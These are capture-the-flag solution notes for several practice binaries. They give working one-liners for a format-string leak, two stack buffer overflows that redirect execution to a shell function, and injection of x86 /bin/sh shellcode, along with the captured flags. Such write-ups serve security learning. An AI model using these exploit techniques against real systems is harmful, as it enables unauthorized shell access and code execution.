Format
-------
Goal: Replace the value of secret with 1337 to get shell 

Method: Find address of secret. It is a global variable and hence found in .data section. 
Run objdump -d
Try to find if you can find the address of secret in the stack by poping its content using %p as arguments to format.
./format "python -c 'print "%p."*10'"
You find that the 7th argument is the address of secret. Replace it as shown in the exploit ! :)

write_right
--------------
This is pretty simple one. The binary ask you to enter the address where you want to write and also the value. We want to write the value 0x1337beef to the address of secret. 
Do objdump -D to find the address of secret. You can find it in .data section as it is a global variable. Provide the address, and then enter the desired value when asked for. 

overflow2
-------------
vulnerability: strcpy()
Goal: Change return address to that of give_shell()
address of give_shell found using objdump -d
./overflow2 $(python -c 'print "A"*20 + "\xad\x84\x04\x08"')
$ cat flag.txt                                                                                
controlling_%eip_feels_great    

overflow1
--------------
./overflow $(python -c 'print "A"*16 + "\xce\xfa\xde\xc0"')
flag: ooh_so_critical

execute
-----------
getegid() - returns effective group id of calling process. 
What is the string entered gets executed. Enter shell code. 
(python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; cat) | ./execute
cat flag.txt
shellcode_is_kinda_cool


